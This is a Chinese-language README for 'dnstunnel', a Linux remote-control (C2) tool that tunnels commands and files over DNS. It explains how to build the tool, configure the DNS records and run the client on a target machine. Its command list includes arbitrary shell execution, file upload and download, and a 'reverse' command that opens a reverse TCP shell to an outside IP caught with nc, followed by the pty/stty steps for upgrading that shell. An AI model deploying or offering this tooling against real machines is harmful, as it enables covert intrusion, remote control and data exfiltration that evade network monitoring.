# dnstunnel
一款LINUX下的支持多会话的二进制DNS隧道远控，一个服务端可以连接多个客户端（暂未做充分测试，欢迎提issue）。
# 说明
DNS通道传输能力非常有限，速率比较低，传输大量的字节需要很长时间。支持PowerPC、ARM、MIPSeb、MIPSel、x86、x86_64等各平台gcc编译使用，交叉编译时注意要先静态编译好zlib(https://github.com/madler/zlib)，然后修改Makefile这一行libz.a的位置：
```
LINKOBJ  = ../common/base32.o log.o ui.o dns.o server.o ../common/util.o ../common/udp.o app.o gateway.o worker.o cmd.o session.o /usr/lib/x86_64-linux-gnu/libz.a
```
客户端默认是静态链接的，是为了防止glibc版本不兼容，有需要可以改成动态链接以减小体积。
## 交互设计
![avatar](https://raw.githubusercontent.com/bigBestWay/dnstunnel/master/flow.jpg)

协议更新前后效果对比： 
传输9K左右数据，使用停等协议需要3分47秒，使用选择性重传（滑动窗口）协议需要1分53秒。
# 编译
依赖zlib  
```
./build.sh
```
编译debug版本  
```
./build.sh debug
```
# 域名配置
使用者需要在域名服务做如下配置(以gandi.net为例):  
添加一条A记录: 
```
ns1 10800 IN A 55.55.55.55
```
再添加一条NS记录: 
```
1 1800 IN NS ns1.test.website.
```
# 使用说明
按照以上添加后, 在55.55.55.55上启动NDNS_server
```
./NDNS_server
```
在目标机带参数启动NDNS_client
```
./NDNS_client .1.test.website
```
# 用户界面
支持如下命令
```
session <list|clientid>
getuid
upload <local> <remote>
download <remote> <local>
bash <shell cmd>
move <src> <dst>
mkdir <dir>
rmdir <dir>
rename <old> <new>
list
rm <file>
cd <dir>
pwd
hostip
reverse <ip> <port>
Session[29727]>>
```
## session
```
session list
```
列出当前所有会话
```
session clientid
```
切换到对应会话  
## getuid  
```
getuid
```
获取当前远程会话的用户ID  
## upload
```
upload aaa bbb
```
将本地文件aaa上传到远程会话机器bbb，限制文件aaa压缩后要小于430字节  
## download
```
download aaa bbb
```
将远程文件aaa下载到本地为bbb，下载速率大概20-30字节/秒，所以千万不要下载大文件，否则耗时超级长  
## bash
```
bash which python
```
可执行任意shell命令，返回执行结果，注意不要执行需要交互的命令  
## move
```
move <src> <dst>
```
和mv功能一致，暂未实现，可能用处很少  
## mkdir
```
mkdir aaa
```
在远端创建文件夹aaa  
## rmdir  
删除远端文件夹  
## rename  
重命令文件  
## list
```
list
```
在远端程序当前目录执行ls -lrt并返回结果  
## rm  
删除远端文件  
## cd  
切换远端程序当前目录  
## pwd  
获取远端程序当前目录  
## hostip  
获取远端机器的出口ip和主机名
## reverse
反弹TCP shell，服务端使用nc -lvnp 56789接收
```
reverse 112.55.4.22 56789
```
nc获得shell后，kali/ubuntu可通过如下命令升级交互式shell
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
$ stty raw -echo
$ fg
```
# systemd-resolve占用53端口的解决方法
以ubuntu为例，编辑
```
/etc/systemd/resolved.conf
```
按下面修改
```
[Resolve]
DNS=8.8.8.8  #取消注释，增加dns
#FallbackDNS=
#Domains=
#LLMNR=no
#MulticastDNS=no
#DNSSEC=no
#Cache=yes
DNSStubListener=no  #取消注释，把yes改为no
```
重启服务
```
systemctl restart systemd-resolved
```